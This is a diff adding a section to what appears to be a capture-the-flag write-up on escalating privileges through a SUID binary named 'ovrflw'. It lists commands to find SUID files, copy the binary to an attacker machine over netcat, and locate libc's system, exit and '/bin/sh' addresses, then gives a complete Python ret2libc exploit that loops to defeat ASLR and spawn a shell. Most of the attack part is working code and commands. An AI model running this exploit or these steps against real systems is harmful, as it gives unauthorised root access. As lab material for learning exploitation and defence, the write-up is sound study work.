@@ -126,6 +126,122 @@ https://seclists.org/fulldisclosure/2019/Apr/24
 ![2](https://user-images.githubusercontent.com/123066149/227937822-b62c4470-c943-486e-aa74-2de73ae958b9.PNG)
 
 
+# ${{\color{green}Buffer : Bypass ASLR}}\ $
+
+
+``find / -perm -4000 2>/dev/null``
+
+![image](https://user-images.githubusercontent.com/123066149/228848043-e31e5e3a-e793-4f11-8e72-3cd151bb67ff.png)
+
+### Transfert file from client to kali
+
+``nc -w 5 10.10.14.3 999 < /usr/local/bin/ovrflw``
+
+``nc -l -p 999 > ovrfl``
+
+![image](https://user-images.githubusercontent.com/123066149/228850260-f2eabad3-353c-4757-83b9-52b18d1d9a92.png)
+
+### Check integrity:
+
+``md5sum ovflw ``
+
+![image](https://user-images.githubusercontent.com/123066149/228850724-35bd36f6-0ddd-4f8c-8bb7-30472dc50f50.png)
+
+### Check kernel version:
+
+``uname -a ``
+
+![image](https://user-images.githubusercontent.com/123066149/228850943-6b897819-d22e-4c2c-a667-90a9f193c75a.png)
+
+``cat /etc/lsb-release``
+
+![image](https://user-images.githubusercontent.com/123066149/228850983-e5219221-7604-4f83-ac42-eeb87c148b9a.png)
+
+![image](https://user-images.githubusercontent.com/123066149/228851291-86389ba2-23d9-4982-93f9-9bc4544c026f.png)
+
+``/usr/local/bin/ovrflw``
+
+![image](https://user-images.githubusercontent.com/123066149/228851397-4db84aab-b7d8-438c-b94f-75d7ab251710.png)
+
+``gdb ovrfl``
+
+``disas main``
+
+![image](https://user-images.githubusercontent.com/123066149/228851968-26270622-8120-446d-846e-23d5ad02dbd0.png)
+
+``msf-pattern_create -l 300``
+
+![image](https://user-images.githubusercontent.com/123066149/228852426-077a99ae-7fac-4fad-956c-e9aced1953c4.png)
+
+![image](https://user-images.githubusercontent.com/123066149/228852654-a2249290-a840-4a6f-b924-265731a8b713.png)
+
+![image](https://user-images.githubusercontent.com/123066149/228948787-fdb9da19-c7d3-4e21-9a6a-3fce64a43c4e.png)
+
+![image](https://user-images.githubusercontent.com/123066149/228948867-48228b79-0142-4535-90d6-2d3629a51438.png)
+
+### Get system address
+
+``p system``
+
+### Check ASLR
+
+``ldd /usr/local/bin/ovrflw | grep libc`` 
+
+
+![image](https://user-images.githubusercontent.com/123066149/228949233-724b39da-cd64-49a7-be5b-31443bf8c213.png)
+
+
+### Find system address :
+
+``readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system``
+
+![image](https://user-images.githubusercontent.com/123066149/228949395-2beecb7d-3929-44ec-855e-604195002920.png)
+
+### Find exit address :
+
+``readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit``
+
+![image](https://user-images.githubusercontent.com/123066149/228949547-9236cd8b-52e2-43db-847d-37d20999e552.png)
+
+### Find /bin/sh address :
+
+``strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh``
+
+![image](https://user-images.githubusercontent.com/123066149/228949734-9e4e3f38-e4fb-4eb7-a9e4-cb9c3b3a7b94.png)
+
+### The exploit :
+
+![image](https://user-images.githubusercontent.com/123066149/228950185-e462d734-0323-4e7c-ba7a-6949d30c7bd1.png)
+
+
+#!/usr/bin/python3
+
+from struct import pack
+from subprocess import call
+
+offset = 112
+junk = b"A"*offset
+
+#ret2libc -> system_addr + exit_addr + bin_sh_addr
+
+base_libc_addr = 0xb7602000
+
+system_addr_off = 0x00040310
+exit_addr_off = 0x00033260
+bin_sh_addr_off = 0x00162bac
+
+system_addr = pack("<L", base_libc_addr + system_addr_off)
+exit_addr = pack("<L",base_libc_addr + exit_addr_off)
+bin_sh_addr = pack("<L", base_libc_addr + bin_sh_addr_off)
+
+payload = junk + system_addr + exit_addr + bin_sh_addr
+
+while True:
+        ret = call(["/usr/local/bin/ovrflw", payload])
+
+![image](https://user-images.githubusercontent.com/123066149/228951637-17575ac8-fadd-452c-85f2-dba0fdf82327.png)
+
+
 # ${{\color{purple}Script}}\ $
 # ${{\color{green}LinPeas}}\ $
 
